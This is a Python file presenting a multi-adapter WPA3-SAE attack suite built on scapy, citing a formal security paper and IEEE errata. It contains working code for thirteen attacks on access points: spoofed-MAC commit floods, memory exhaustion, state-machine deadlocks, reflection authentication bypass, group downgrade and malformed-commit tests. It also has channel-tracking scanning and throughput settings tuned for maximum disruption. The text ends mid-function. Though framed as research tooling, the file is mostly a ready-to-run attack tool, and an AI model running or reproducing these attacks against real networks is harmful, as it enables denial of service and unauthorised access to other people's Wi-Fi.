#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
WPA3-SAE Formal Attack Suite (Educational/Research Edition)
================================================================================
Based on: "What a Mesh: Formal Security Analysis of WPA3 SAE"
(arXiv:2603.23352v1, Metere et al., 2026)
Errata:   IEEE 802.11-24/0027r0-r2 & 0744r1 (Accepted Patches)
================================================================================
ATTACKS IMPLEMENTED (Paper Sections & Errata):
1. commit_flood                     : §VI-B (Cookie Guzzler / Anti-Clogging Bypass)
2. reflection_attack                : §VI-A, Erratum #23 (Replay/Auth Bypass via cL=cR)
3. memory_exhaustion                : §VI-B (Known-MAC Resource Drain)
4. deadlock                         : §VI-B, Erratum #16, #17 (COMMITTED → Invalid Commit → No Del)
5. zero_scalar                      : §12.4.5.4 (Invalid Scalar=0)
6. invalid_curve                    : §12.4.5.4 (Identity Element=0)
7. downgrade                        : §12.4.8.6.4, Erratum #19 (Weak MODP Groups + MAC Logic)
8. open_auth                        : Legacy 802.11 DoS (algo=0)
9. unknown_pw_id                    : §VI-C, Erratum #1, #16 (Stall in NOTHING State)
10. simultaneous_pw_id_conflict     : §VI-C-1 (Non-termination Loop via PW-ID conflict)
11. group_mismatch_tiebreaker_deadlock : §VI-C-3, Erratum #M (MAC Tiebreaker Deadlock)
12. threshold_boundary              : §12.4.6, App.B.C (Boundary > vs >= check)
13. silent_discard                  : §12.4.8.6.3, App.B.K (Sniffing invalid commit responses)
================================================================================
"""
import os, sys, time, glob, random, signal, subprocess, logging, argparse, json
from datetime import datetime
from multiprocessing import Process, Value, Manager, Lock
from threading import Thread

SHUTDOWN_FLAG = Value('b', False)

from scapy.all import (
    RadioTap, Dot11, Dot11Auth, Dot11Deauth, RandMAC, sniff, sendp, conf
)

# ==============================================================================
# LOGGING & CONFIGURATION
# ==============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%S'
)
logger = logging.getLogger("WPA3-SAE-Research")

# ==============================================================================
# SCIENTIFIC & ATTACK TUNING CONSTANTS (Paper §12.4.6, §12.4.8)
# ==============================================================================
# IEEE 802.11 standard anti-clogging threshold. The AP activates defense after 
# this many new/failed authentication attempts. Keep at 5 for standard-compliant 
# DoS testing. Lowering it triggers AP protection earlier; raising it delays it.
ANTI_CLOGGING_THRESHOLD = 5

# Number of SAE-Commit frames sent per single burst. Larger values increase AP 
# RAM/CPU load but may cause driver buffer overflows or TX drops. Reduce to 64 
# for unstable/cheap Wi-Fi adapters, or increase to 256 for high-end hardware.
BURST_SIZE = 128

# Minimum time gap (seconds) between individual packets within a burst. Controls 
# raw transmission speed. Too low (<0.00005) causes hardware/driver drops; too 
# high reduces attack efficiency. Adjust based on your adapter's TX capabilities.
INTER_PACKET_GAP = 0.0001

# Global rate limiter: maximum packets per second across all bursts. Prevents 
# adapter overheating, driver crashes, or immediate AP firmware resets. Increase 
# for stronger load, decrease if you see "No such device" or TX drop errors.
PACKETS_PER_SECOND_LIMIT = 1000000     # Effectively disabled for maximum throughput #1000

# Delay (seconds) between consecutive bursts. Lower values (e.g., 0.3) increase 
# DoS intensity and stress the AP state machine faster, but may flood console logs. 
# Higher values (1.0+) allow partial AP state recovery and keep output readable.
LOG_DELAY_BETWEEN_BURSTS = 1.0

# Delay (seconds) between starting different attack processes/adapters in the 
# orchestrator. Prevents simultaneous channel switches and scanner conflicts. 
# Increase if adapters fail to initialize; decrease for faster multi-IF startup.
LOG_DELAY_BETWEEN_ATTACKS = 2.0


# SAE Group IDs & Payload Lengths (Group 19-24)
SAE_GROUP_BYTES = {
    19: b'\x13\x00', 20: b'\x14\x00', 21: b'\x15\x00',
    22: b'\x16\x00', 23: b'\x17\x00', 24: b'\x18\x00'
}
SAE_GROUP_LENGTHS = {
    19: (32, 64), 20: (48, 96), 21: (66, 132),
    22: (32, 256), 23: (32, 384), 24: (32, 512)
}

# ==============================================================================
# TARGET & ENVIRONMENT CONFIG (FILL BEFORE USE)
# ==============================================================================
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"      # Replace with actual 5GHz BSSID
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:12"    # Replace with actual 2.4GHz BSSID

# ==============================================================================
# SAE PARAMETERS - GROUP-AWARE DICTIONARIES (Groups 19-24)
# Structure: {group_id: [list of hex strings]}
# Replace INSERT placeholders with actual values from sae_extractor_arxiv_all_groups.py
# ==============================================================================
# ------------------------- SAE PARAMETER (from sae_extractor_arxiv_all_groups.py) -------------------------
# --- 5 GHz Band ---
SAE_SCALARS_5GHZ = {
    19: [
'INSERT_GROUP_19_SCALAR_5GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    
    ],
    20: [
'INSERT_GROUP_20_SCALAR_5GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    21: [
'INSERT_GROUP_21_SCALAR_5GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    22: ['INSERT_GROUP_22_SCALAR_5GHZ'],
    23: ['INSERT_GROUP_23_SCALAR_5GHZ'],
    24: ['INSERT_GROUP_24_SCALAR_5GHZ'],
}
SAE_FINITES_5GHZ = {
    19: [
'INSERT_GROUP_19_FINITE_5GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    20: [
'INSERT_GROUP_20_FINITE_5GHZ'    
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    21: [
'INSERT_GROUP_21_FINITE_5GHZ'    
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    22: ['INSERT_GROUP_22_FINITE_5GHZ'],
    23: ['INSERT_GROUP_23_FINITE_5GHZ'],
    24: ['INSERT_GROUP_24_FINITE_5GHZ'],
}

# --- 2.4 GHz Band ---
SAE_SCALARS_2_4GHZ = {
    19: [
'INSERT_GROUP_19_SCALAR_2_4GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    

    ],
    20: [

'INSERT_GROUP_20_SCALAR_2_4GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    
    
    ],
    21: [

'INSERT_GROUP_21_SCALAR_2_4GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    
    
    ],
    22: ['INSERT_GROUP_22_SCALAR_2_4GHZ'],
    23: ['INSERT_GROUP_23_SCALAR_2_4GHZ'],
    24: ['INSERT_GROUP_24_SCALAR_2_4GHZ'],
}
SAE_FINITES_2_4GHZ = {
    19: [
'INSERT_GROUP_19_FINITE_2_4GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    

    ],
    20: [
'INSERT_GROUP_20_FINITE_2_4GHZ'    
#Enter 20 values from sae_extractor_arxiv_all_groups.py            
   
    ],
    21: [
'INSERT_GROUP_21_FINITE_2_4GHZ'    
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
        
    ],
    22: ['INSERT_GROUP_22_FINITE_2_4GHZ'],
    23: ['INSERT_GROUP_23_FINITE_2_4GHZ'],
    24: ['INSERT_GROUP_24_FINITE_2_4GHZ'],
}

# Known MACs for memory_exhaustion (Output from capture_known_macs.py)
KNOWN_STA_MACS_5GHZ   = [

]
KNOWN_STA_MACS_2_4GHZ = [

]

# Scanner & Channel Config
SCANNER_INTERFACE = ""             # Leave empty to disable scanner or wlanXmon
SCANNER_INTERVAL  = 2
SCANNER_DURATION  = 45             # Duration of a single scan cycle – how long the native scanner listens per run.
MANUAL_CHANNEL_5GHZ   = ""         # MANUAL CHANNEL
MANUAL_CHANNEL_2_4GHZ = ""         # MANUAL CHANNEL

# Adapter -> Attack Mapping
ADAPTER_CONFIGURATION = {
    # --- 5 GHz Band ---
#    "wlan5mon":  {"band": "5GHz", "attack": "simultaneous_pw_id_conflict"},
     "wlan7mon":  {"band": "5GHz", "attack": "unknown_pw_id"},
    # --- 2.4 GHz Band ---    
#    "wlan2mon":  {"band": "2.4GHz", "attack": "memory_exhaustion"},
     "wlan2mon":  {"band": "2.4GHz", "attack": "unknown_pw_id"}        
}

# ==============================================================================
# ENCYCLOPEDIA TEXT (Printed in Help Menu)
# ==============================================================================
ENCYCLOPEDIA_TEXT = """
====================== ENCYCLOPEDIA OF ATTACKS ======================

Here you will find a detailed explanation for each available attack type.
Based on: "What a Mesh: Formal Security Analysis of WPA3 SAE Wireless
           Authentication" (arXiv:2603.23352v1) and Dragonblood research.

1. commit_flood (Cookie Guzzler / Omnivore) – Denial of Service
   Type: DoS
   Target: WPA3 Access Points
   Method: Rapidly sends SAE Commit frames from constantly changing,
   random MAC addresses. Each new MAC forces the AP to allocate a new
   protocol instance and memory. Once the anti-clogging threshold is
   exceeded, further commits are rejected but still cause high CPU load
   and memory fragmentation.
   Paper-Ref: §VI-B (Memory Exhaustion / Cookie Guzzler)

2. reflection_attack (SAE-Reflection) – Authentication Bypass
   Type: Auth-Bypass
   Target: WPA3 APs with flawed SAE implementations (pre-2020)
   Method: The attacker sends a valid SAE commit to the AP and stores
   its scalar and element. When the AP responds with its own commit,
   this frame is replayed back to the AP. If the AP lacks reflection
   protection, this can lead to successful association without knowing
   the password.
   Standard-Fix: Erratum #23
   Paper-Ref: §VI-A, Fig. 5

3. memory_exhaustion (Known-MAC Resource Drain) – Resource DoS
   Type: DoS
   Target: WPA3 APs
   Method: Similar to commit_flood, but preferentially uses MAC addresses
   from previous incomplete SAE handshakes. These often bypass the
   anti-clogging threshold.
   Paper-Ref: §VI-B

4. deadlock (State Machine Deadlock)
   Type: State Machine Attack
   Target: WPA3 APs
   Method: A valid commit transitions the protocol instance into the
   COMMITTED state. Then, an invalid commit is sent. Without a Del-event,
   the instance hangs indefinitely and blocks further auth attempts.
   Standard-Fix: Errata #16, #17
   Paper-Ref: §VI-B

5. zero_scalar (Invalid Scalar=0)
   Type: Cryptographic Weakness
   Target: Implementations failing to validate the scalar
   Method: Sends SAE commits with scalar = 0.
   Origin: Dragonblood; Validation required per §12.4.5.4

6. invalid_curve (Identity Element=0)
   Type: Information Leak
   Target: Implementations lacking curve validation
   Method: Sends commits where the element (point) does not lie on the
   elliptic curve.
   Origin: Dragonblood; Validation required per §12.4.5.4

7. downgrade (Group Downgrade)
   Type: Downgrade Attack
   Target: WPA3 APs not enforcing Group 19
   Method: Instead of Group 19, proposes weak groups (22, 23).
   Standard-Fix: Erratum #19
   Paper-Ref: §12.4.8.6.4, Erratum #19

8. open_auth (Legacy Open Authentication Flood)
   Type: DoS
   Target: Any 802.11 AP (WPA2/WPA3)
   Method: Floods the AP with basic Open System Authentications (algo=0).
   Origin: Generic 802.11 Attack

9. unknown_pw_id (Password Identifier Stall)
   Type: Memory DoS / State Machine Stall
   Target: WPA3 APs supporting Password Identifiers
   Method: Sends SAE commits with a random Password Identifier. 
   The AP responds with an error but fails to free the protocol instance.
   Standard-Fix: Errata #1, #16
   Paper-Ref: §VI-C (Password Identifier DoS)
   
10. simultaneous_pw_id_conflict (Password Identifier Conflict) – Non-termination Loop
    Type: State Machine Attack / DoS
    Method: Continuously sends valid SAE commits but alternates back and forth 
    between two different, valid Password IDs. Causes infinite loops.
    Paper-Ref: §VI-C-1 (Correctness violation / Non-termination Loop)

11. group_mismatch_tiebreaker_deadlock (MAC Tiebreaker Deadlock) – Denial of Service
    Type: State Machine Deadlock
    Method: Forces the AP into the "yielder" role (Group Mismatch) using a 
    spoofed, numerically larger MAC address. A malformed payload then blocks 
    it permanently.
    Standard-Fix: Erratum #M (Group Mismatch Error Handling)

12. threshold_boundary (Anti-Clogging Boundary Test) – DoS / Security Evaluation
    Type: Specification Flaw / DoS
    Method: Sends exactly as many token-less commits as the threshold (e.g., 5). 
    Tests for off-by-one errors (usage of '>' vs. '>=').
    Standard-Fix: Erratum #C (Anti-Clogging Threshold operators)

13. silent_discard (Silent Discard Validation) – Error Handling Test
    Type: Information Leak Evaluation
    Method: Sends extremely malformed commits (e.g. scalar=0) and listens 
    whether the AP erroneously replies instead of silently discarding the packet.
    Standard-Fix: Erratum #K (Silent Discard on Commit Validation Failure)   
"""
# ==============================================================================
def build_sae_payload(group_id: int, scalar: bytes, element: bytes, pw_id: str = None) -> bytes:
    """Builds SAE Commit payload per IEEE 802.11-2020 §12.4.5.4."""
    payload = group_id.to_bytes(2, 'big') + scalar + element
    if pw_id is not None:
        payload += pw_id.encode('utf-8')
    return payload

def validate_sae_data(band: str) -> bool:
    """Checks if at least one valid SAE pair exists for the target band."""
    sc = SAE_SCALARS_5GHZ if band == "5GHz" else SAE_SCALARS_2_4GHZ
    fi = SAE_FINITES_5GHZ if band == "5GHz" else SAE_FINITES_2_4GHZ
    valid = [g for g in sc if any("INSERT" not in v for v in sc[g]) and any("INSERT" not in v for v in fi.get(g, []))]
    if not valid:
        logger.warning(f"[VALIDATION] {band}: No valid SAE data found. Attack will use random bytes.")
        return False
    logger.info(f"[VALIDATION] {band}: Valid groups: {valid}")
    return True

def get_valid_groups(band: str) -> list:
    """Returns list of group IDs that contain valid scalar/finite pairs."""
    sc = SAE_SCALARS_5GHZ if band == "5GHz" else SAE_SCALARS_2_4GHZ
    fi = SAE_FINITES_5GHZ if band == "5GHz" else SAE_FINITES_2_4GHZ
    valid = []
    for gid in [19, 20, 21, 22, 23, 24]:
        s_list = sc.get(gid, [])
        f_list = fi.get(gid, [])
        has_valid = any("INSERT" not in s for s in s_list) and any("INSERT" not in f for f in f_list)
        if has_valid:
            valid.append(gid)
    return valid if valid else [19]

def build_valid_pairs(scalars_list, finites_list, group_id):
    """Builds list of valid (scalar, finite) pairs for a group using zip."""
    s_len, e_len = SAE_GROUP_LENGTHS[group_id]
    pairs = []
    for s, f in zip(scalars_list, finites_list):
        s_clean = s.strip()
        f_clean = f.strip()
        if ("INSERT" not in s_clean and len(s_clean) == s_len*2 and
            "INSERT" not in f_clean and len(f_clean) == e_len*2 and
            all(c in '0123456789abcdefABCDEF' for c in s_clean+f_clean)):
            try:
                pairs.append((bytes.fromhex(s_clean), bytes.fromhex(f_clean)))
            except ValueError:
                continue
    return pairs

def get_sae_pair_from_list(valid_pairs):
    """Safely returns a random valid pair, falls back to random bytes if empty."""
    if not valid_pairs:
        s_len, e_len = SAE_GROUP_LENGTHS[19]
        return os.urandom(s_len), os.urandom(e_len)
    return random.choice(valid_pairs)

def set_channel_scientific(interface: str, channel: str) -> bool:
    """Robust channel switching via phy interface."""
    subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
    time.sleep(0.1)
    try:
        info = subprocess.run(['iw', 'dev', interface, 'info'], capture_output=True, text=True, timeout=2)
        phy_num = next((line.strip().split()[1] for line in info.stdout.splitlines() if line.strip().startswith('wiphy')), None)
        if not phy_num:
            return False
        res = subprocess.run(['iw', 'phy', f'phy{phy_num}', 'set', 'channel', str(channel)], capture_output=True, timeout=2)
        if res.returncode == 0:
            time.sleep(0.3)
            return True
    except Exception as e:
        logger.warning(f"[CHANNEL] Setup failed: {e}")
    return False

def send_burst_scientific(packet_list: list, interface: str, counter: Value, dry_run: bool = False):
    """Paper-aligned burst sending using L2socket with timeout to prevent CSMA/CA freezes."""
    if not packet_list or dry_run:
        return
    start = time.time()
    batch = packet_list[:BURST_SIZE]
    sent_count = 0
    try:
        import socket
        sock = conf.L2socket(iface=interface)
        
        try:
            sock.outs.settimeout(0.05) 
        except Exception:
            pass

        for p in batch:
            try:
                sock.send(p)
                sent_count += 1
            except (socket.timeout, BlockingIOError):
                time.sleep(0.005)
            except OSError as e:
                if e.errno == 105:
                    time.sleep(0.005)
                else:
                    pass 
            
            if INTER_PACKET_GAP > 0:
                time.sleep(INTER_PACKET_GAP)
        sock.close()
        
        elapsed = time.time() - start
        target = len(batch) / PACKETS_PER_SECOND_LIMIT
        if elapsed < target:
            time.sleep(target - elapsed)
        try:
            with counter.get_lock():
                counter.value += sent_count
        except (OSError, ValueError, RuntimeError):
            pass
    except Exception as e:
        if "No such device" in str(e):
            logger.error(f"[HW ERROR] {interface} disappeared")
            time.sleep(2)
        else:
            logger.warning(f"[SEND] {interface}: {e}")

def scanner_process(iface, interval, duration, shared, lock, b5, b2):
    """Continuous scanner loop that flushes memory regularly and breathes."""
    if not iface: return
    try:
        while True:
            if SHUTDOWN_FLAG.value:
                break
                
            prefix = f"/tmp/scan_cont_{int(time.time())}"
            
            proc = subprocess.Popen(
                ['airodump-ng', '--write', prefix, '--output-format', 'csv', '--band', 'abg', '--write-interval', '2', iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            scan_start = time.time()
            while time.time() - scan_start < duration:
                if SHUTDOWN_FLAG.value:
                    break
                time.sleep(3)
                csvs = glob.glob(f"{prefix}-*.csv")
                if csvs:
                    latest_csv = max(csvs, key=os.path.getctime)
                    found = parse_airodump_csv(latest_csv, b5, b2)
                    with lock:
                        for b, ch in found.items():
                            if shared.get(b) != str(ch):
                                shared[b] = str(ch)
                                logger.info(f"[SCANNER] {b} AP detected on channel {ch}")
                                
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    
            for f in glob.glob(f"{prefix}*"):
                try: os.remove(f)
                except Exception: pass
                
            if SHUTDOWN_FLAG.value:
                break
                
            time.sleep(interval)
            
    except KeyboardInterrupt:
        pass
    finally:
        for f in glob.glob("/tmp/scan_cont_*"):
            try: os.remove(f)
            except Exception: pass

def parse_airodump_csv(csv_file: str, b5: str, b2: str) -> dict:
    """Parses airodump-ng CSV output - separates header block from data."""
    results = {}
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        blocks = content.split('\n\n')
        if not blocks:
            return results
        for line in blocks[0].strip().split('\n'):
            if 'BSSID' in line or line.startswith('#') or not line.strip():
                continue
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 14 and parts[3].isdigit():
                ch = int(parts[3])
                if parts[0].upper() == b5.upper() and 36 <= ch <= 165:
                    results['5GHz'] = parts[3]
                elif parts[0].upper() == b2.upper() and 1 <= ch <= 14:
                    results['2.4GHz'] = parts[3]
    except Exception:
        pass
    return results

def get_greater_mac(target_bssid):
    """Generates a MAC address numerically strictly greater than the target BSSID."""
    bssid_val = int(target_bssid.replace(':', ''), 16)
    while True:
        candidate = str(RandMAC())
        first_byte = int(candidate[:2], 16)
        if (first_byte & 1) == 0:
            candidate_val = int(candidate.replace(':', ''), 16)
            if candidate_val > bssid_val:
                return candidate

def _silent_discard_callback(bssid: str, results: dict, lock_obj):
    """Sniffer callback to categorize AP responses to invalid commits."""
    def cb(pkt):
        if pkt.haslayer(Dot11Auth) and pkt.addr2 == bssid:
            status = pkt[Dot11Auth].status
            with lock_obj:
                if status == 0:
                    results['accepted'] += 1
                elif status in (15, 17):
                    results['rejected'] += 1
                else:
                    results['other'] += 1
    return cb
# ==============================================================================
# ATTACK ENGINE (§VI-A, §VI-B, §VI-C)
# ==============================================================================
def run_attacker_process(interface, bssid, initial_channel, band, attack_type, counter, shared_channels, sae_group=None, dry_run=False):
    """Main attacker loop inside its own process. Dynamically resolves valid groups and tracks channels."""
    current_channel = str(initial_channel)
    if current_channel and not set_channel_scientific(interface, current_channel):
        logger.warning(f"[ATTACK] {interface}: Channel setup warning, continuing...")

    valid_groups = get_valid_groups(band)
    group_index = 0
    logger.info(f"[ATTACK] {interface} | Valid Groups: {valid_groups} | Band: {band} | Initial Ch: {current_channel}")

    scalars = SAE_SCALARS_5GHZ if band == "5GHz" else SAE_SCALARS_2_4GHZ
    finites = SAE_FINITES_5GHZ if band == "5GHz" else SAE_FINITES_2_4GHZ
    known_macs = KNOWN_STA_MACS_5GHZ if band == "5GHz" else KNOWN_STA_MACS_2_4GHZ

    def build_valid_pairs(scalars_list, finites_list, group_id):
        s_len, e_len = SAE_GROUP_LENGTHS[group_id]
        pairs = []
        for s, f in zip(scalars_list, finites_list):
            s_clean = s.strip()
            f_clean = f.strip()
            if ("INSERT" not in s_clean and len(s_clean) == s_len*2 and
                "INSERT" not in f_clean and len(f_clean) == e_len*2 and
                all(c in '0123456789abcdefABCDEF' for c in s_clean+f_clean)):
                try: pairs.append((bytes.fromhex(s_clean), bytes.fromhex(f_clean)))
                except ValueError: continue
        return pairs

    precomputed_pairs = {}
    for gid in valid_groups:
        valid_s = [s for s in scalars.get(gid, []) if "INSERT" not in s]
        valid_f = [f for f in finites.get(gid, []) if "INSERT" not in f]
        precomputed_pairs[gid] = build_valid_pairs(valid_s, valid_f, gid)
    # =============================================================

    burst_count = 0
    own_commit_cache = {}

    try:
        while True:
            if SHUTDOWN_FLAG.value:
                logger.info(f"[STOP] {interface} received shutdown signal")
                break

            latest_channel = shared_channels.get(band)
            if latest_channel and latest_channel != current_channel:
                logger.info(f"[TRACKING] {interface}: AP changed channel from {current_channel} to {latest_channel}. Hopping...")
                current_channel = latest_channel
                set_channel_scientific(interface, current_channel)

            sae_group = valid_groups[group_index % len(valid_groups)]
            group_index += 1

            valid_pairs = precomputed_pairs.get(sae_group, [])

            if valid_pairs:
                preview_s = valid_pairs[0][0][:4].hex()
                preview_f = valid_pairs[0][1][:4].hex()
                logger.info(f"[PAIRS] [{interface} | {band}] Group {sae_group}: {len(valid_pairs)} valid pairs loaded. Sample: S={preview_s}... F={preview_f}...")
            else:
                logger.warning(f"[PAIRS] [{interface} | {band}] Group {sae_group}: No valid pairs. Falling back to random bytes.")

            def get_sae_pair():
                if not valid_pairs:
                    s_len, e_len = SAE_GROUP_LENGTHS[sae_group]
                    return os.urandom(s_len), os.urandom(e_len)
                return random.choice(valid_pairs)

            def make_commit(mac, seq=1, gid=sae_group, s_bytes=None, f_bytes=None, pw_id=None):
                if s_bytes is None or f_bytes is None:
                    gen_s, gen_f = get_sae_pair()
                    if s_bytes is None: s_bytes = gen_s
                    if f_bytes is None: f_bytes = gen_f
                payload = build_sae_payload(gid, s_bytes, f_bytes, pw_id)
                return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid)/Dot11Auth(algo=3, seqnum=seq, status=0)/payload

            def safe_send(pkt, iface, dry):
                if not dry:
                    try:
                        sock = conf.L2socket(iface=iface)
                        sock.send(pkt)
                        sock.close()
                    except Exception: pass

            packets = []
            t0 = time.time()

            if attack_type == "commit_flood":
                macs = [str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD - 1)]
                for m in macs:
                    packets.append(make_commit(m))
                packets *= 20
            elif attack_type == "reflection_attack":
                own_mac = str(RandMAC())
                s, f = get_sae_pair()
                own_commit_cache[own_mac] = (s, f)
                safe_send(make_commit(own_mac, s_bytes=s, f_bytes=f), interface, dry_run)
                def reflection_cb(pkt):
                    if pkt.haslayer(Dot11Auth) and pkt.addr2 == bssid and pkt[Dot11Auth].algo == 3 and pkt[Dot11Auth].seqnum == 1:
                        payload = bytes(pkt[Dot11Auth].payload)
                        s_len, e_len = SAE_GROUP_LENGTHS[sae_group]
                        peer_s = payload[2:2+s_len]
                        peer_f = payload[2+s_len:2+s_len+e_len]
                        if pkt.addr1 in own_commit_cache:
                            os, of = own_commit_cache[pkt.addr1]
                            if peer_s == os and peer_f == of:
                                reflect = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=pkt.addr1, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/payload
                                safe_send(reflect, interface, dry_run)
                                logger.info(f"[REFLECTION] Match found! Reflected own commit (cL=cR)")
                sniff(iface=interface, prn=reflection_cb, timeout=2, store=False)
                own_commit_cache.clear()
                time.sleep(0.5)
            elif attack_type == "memory_exhaustion":
                macs = random.choices(known_macs, k=ANTI_CLOGGING_THRESHOLD) if known_macs else [str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD)]
                for m in macs:
                    packets.append(make_commit(m))
                packets *= 50
            elif attack_type == "deadlock":
                mac = str(RandMAC())
                packets.append(make_commit(mac))
                s_len, e_len = SAE_GROUP_LENGTHS[sae_group]
                inv_s = b'\x01' + b'\x00' * (s_len - 1)
                inv_f = b'\x01' + b'\x00' * (e_len - 1)
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(mac, s_bytes=inv_s, f_bytes=inv_f))
            elif attack_type == "zero_scalar":
                s_len = SAE_GROUP_LENGTHS[sae_group][0]
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(str(RandMAC()), s_bytes=b'\x00'*s_len))
            elif attack_type == "invalid_curve":
                e_len = SAE_GROUP_LENGTHS[sae_group][1]
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(str(RandMAC()), f_bytes=b'\x00'*e_len))
            elif attack_type == "downgrade":
                for g in [22, 23]:
                    s_len, e_len = SAE_GROUP_LENGTHS[g]
                    for _ in range(BURST_SIZE // 2):
                        packets.append(make_commit(str(RandMAC()), gid=g, s_bytes=os.urandom(s_len), f_bytes=os.urandom(e_len)))
            elif attack_type == "open_auth":
                for _ in range(BURST_SIZE):
                    packets.append(RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=0, seqnum=1, status=0))
            elif attack_type == "unknown_pw_id":
                macs = known_macs if known_macs else [str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD)]
                for m in macs:
                    s, f = get_sae_pair()
                    unk_id = f"malicious_{random.randint(1000,9999)}"
                    packets.append(make_commit(m, s_bytes=s, f_bytes=f, pw_id=unk_id))
                packets *= (BURST_SIZE // max(1, len(macs)))
            elif attack_type == "simultaneous_pw_id_conflict":
                mac = str(RandMAC())
                pw_id_a = f"profile_{random.randint(1, 9)}"
                pw_id_b = f"profile_{random.randint(10, 19)}"
                for _ in range(BURST_SIZE // 2):
                    s, f = get_sae_pair()
                    packets.append(make_commit(mac, s_bytes=s, f_bytes=f, pw_id=pw_id_a))
                    packets.append(make_commit(mac, s_bytes=s, f_bytes=f, pw_id=pw_id_b))

            elif attack_type == "group_mismatch_tiebreaker_deadlock":
                attacker_mac = get_greater_mac(bssid)
                mismatch_group = 20 if sae_group == 19 else 19
                s_len, e_len = SAE_GROUP_LENGTHS[mismatch_group]
                inv_s, inv_f = b'\x00'*s_len, b'\x00'*e_len
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(attacker_mac, gid=mismatch_group, s_bytes=inv_s, f_bytes=inv_f))

            elif attack_type == "threshold_boundary":
                macs = [str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD)]
                for m in macs:
                    packets.append(make_commit(m))

            elif attack_type == "silent_discard":
                res = {'accepted': 0, 'rejected': 0, 'other': 0}
                lock_obj = Lock()
                sniff_thread = Thread(target=sniff, kwargs={
                    'iface': interface,
                    'prn': _silent_discard_callback(bssid, res, lock_obj),
                    'timeout': 3,
                    'store': False,
                    'lfilter': lambda p: p.haslayer(Dot11Auth) and p.addr2 == bssid
                })
                sniff_thread.start()
                
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(str(RandMAC()), s_bytes=b'\x00' * SAE_GROUP_LENGTHS[sae_group][0]))
                
                send_burst_scientific(packets, interface, counter, dry_run)
                packets = [] 
                sniff_thread.join()
                
                logger.info(f"[SILENT_DISCARD] AP Response Summary: "
                            f"Accepted={res['accepted']} | Rejected={res['rejected']} | Other={res['other']}")
                if res['accepted'] > 0:
                    logger.warning("[SILENT_DISCARD] CRITICAL: AP accepted invalid scalar=0!")
            
            else:
                logger.warning(f"[ATTACK] Unknown type: {attack_type}. Fallback to commit_flood.")
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(str(RandMAC())))

            if packets:
                send_burst_scientific(packets, interface, counter, dry_run)
                burst_count += 1
                dt = time.time() - t0

                # Every 5 bursts are displayed
                LOG_EVERY_N_BURSTS = 5  
                if burst_count % LOG_EVERY_N_BURSTS == 0:
                    logger.info(f"[BURST] Interface: {interface} | Band: {band} | Channel: {current_channel} | Attack: {attack_type.upper()} | Active Group: {sae_group} | Pairs: {len(valid_pairs)} | Burst: #{burst_count} | Duration: {dt:.3f}s")

                time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))

    except KeyboardInterrupt:
        logger.info(f"[STOP] Interface: {interface} interrupted")
    except Exception as e:
        logger.error(f"[CRASH] Interface: {interface} | Error: {e}")

# ==============================================================================
# ERRATA COVERAGE & LOGGING
# ==============================================================================
ERRATA_MAP = {
    "reflection_attack": ["#23 Replay/Reflection guard (cL≠cR)"],
    "deadlock": ["#16 Del-event after UNKNOWN_PASSWORD_IDENTIFIER", "#17 Silent discard + Del on validation fail"],
    "unknown_pw_id": ["#1 Mesh PW-ID restriction", "#16 Del-event after UNKNOWN_PASSWORD_IDENTIFIER"],
    "downgrade": ["#19 Group negotiation Fail-event & MAC logic"],
    "memory_exhaustion": ["#5 Anti-clogging >= threshold"],
    "simultaneous_pw_id_conflict": ["#A Password Identifier Handling restrictions"],
    "group_mismatch_tiebreaker_deadlock": ["#M Group Mismatch Error Handling"],
    "threshold_boundary": ["#C Anti-Clogging Threshold operators"],
    "silent_discard": ["#K Silent Discard on Commit Validation Failure"]
}

def log_attack_meta(attack: str, band: str, ch: str, iface: str, dry: bool):
    """Writes attack metadata to a JSON-lines log file for research documentation."""
    meta = {
        "timestamp": datetime.now().isoformat(),
        "attack": attack,
        "band": band,
        "channel": ch,
        "interface": iface,
        "dry_run": dry,
        "errata_mitigations": ERRATA_MAP.get(attack, ["N/A"])
    }
    with open("/tmp/sae_attack_log.jsonl", "a") as f:
        f.write(json.dumps(meta) + "\n")

# ==============================================================================
# GRACEFUL SHUTDOWN HANDLER
# ==============================================================================
def graceful_shutdown(sig, frame):
    logger.info("[SIGNAL] Shutdown requested. Stopping all processes...")
    SHUTDOWN_FLAG.value = True

def cleanup(procs, scanner):
    for iface, p in procs.items():
        try:
